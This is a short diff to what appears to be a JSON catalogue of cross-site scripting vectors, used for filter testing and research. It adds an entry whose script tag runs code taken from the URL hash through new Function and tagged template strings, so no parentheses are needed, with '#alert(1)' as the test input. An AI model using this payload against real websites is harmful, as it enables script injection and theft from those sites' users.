@@ -108,5 +108,16 @@
             "safari"
         ],
         "url": ""
+    },
+    {
+        "description": "No parentheses using template strings and location hash",
+        "code": "<script>new Function`X${document.location.hash.substr`1`}`<\/script>",
+        "browsers": [
+            "chrome",
+            "firefox",
+            "edge",
+            "safari"
+        ],
+        "hash": "#alert(1)"
     }
 ]
